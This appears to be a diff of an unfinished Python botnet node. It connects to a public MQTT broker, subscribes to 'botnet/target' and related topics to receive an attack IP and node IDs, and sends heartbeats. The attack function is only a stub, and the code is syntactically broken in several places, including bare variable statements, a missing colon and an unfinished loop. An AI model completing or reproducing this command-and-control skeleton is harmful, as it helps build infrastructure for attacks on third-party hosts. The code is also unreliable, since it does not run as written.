@@ -2,9 +2,9 @@ import paho.mqtt.client as mqtt
 import time
 broker = "iot.eclipse.org"
 port = 1883
-global received
-global nodeId
-global lastId
+received
+nodeId
+lastId
 received = -1
 lastId = -555
 nodeId = -1
@@ -12,16 +12,24 @@ restas = 0
 attackDirection = "0.0.0.0"
 heartbeat = "Node "+str(nodeId)+" alive"
 
-# Establishing new last id and setting it to node
+#Attacking
+#def attack(direction):
+    #while(True):
+    #    attack(direction)
+        #Get direction
+        #Check every n loops for stop, waits 4 seconds
 
-def attack(ip):
-    while 
+# Establishing new last id and setting it to node
 def setNodeId(newLastId):
     global nodeId
     nodeId = newLastId
     print("Node id:", newLastId)
     ret = client.publish("botnet/lastId", nodeId)
 
+def setLastId(newLastId):
+    global lastId
+    lastId = int(msg.payload)
+    print("New local last id:", lastId)
 
 def on_publish(client, userdata, result):
     print("data published ",userdata," \n")
@@ -29,21 +37,17 @@ def on_publish(client, userdata, result):
 
 # The callback for when the client receives a CONNACK response from the server.
 #on connect y onmessage distintos para raiz y esclavos --> entrada mensaje de dirección a atacar //// controlar last id
-
-
 def on_connect(client, userdata, flags, rc):
     print("Connected with result code "+str(rc))
     # Subscribing in on_connect() means that if we lose the connection and
     # reconnect then subscriptions will be renewed.
     # client.subscribe("$SYS/#")
-    client.subscribe("botnet/target")
+    client.subscribe("botnet/target") #start / stop
     client.subscribe("botnet/heartbeatId") #Imprime lastId
     client.subscribe("botnet/lastId")
-    client.subscribe("botnet/attackstatus") #start / stop
+#    client.subscribe("botnet/attackstatus") 
 
 # The callback for when a PUBLISH message is received from the server.
-
-
 def on_message(client, userdata, msg):
     global received
     global lastId
@@ -51,9 +55,12 @@ def on_message(client, userdata, msg):
     print(" ")
     received = 1
     if(msg.topic == "botnet/lastId" and lastId != int(msg.payload)):
-        lastId = int(msg.payload)
-        print("New local last id:", lastId)
-
+        setLastId(int(msg.payload))
+    if(msg.topic=="botnet/target" and msg.payload!="0.0.0.0")
+    startTime = time.time()
+    while(True):
+        if(int((time.time()-startTime) % 60) == 0):
+            
 
 client = mqtt.Client()
 client.on_connect = on_connect
@@ -67,10 +74,6 @@ client.connect(broker, port)
 # manual interface.
 
 # Runs until it receives a message
-
-#
-
-
 
 startTime = time.time()
 while(True):
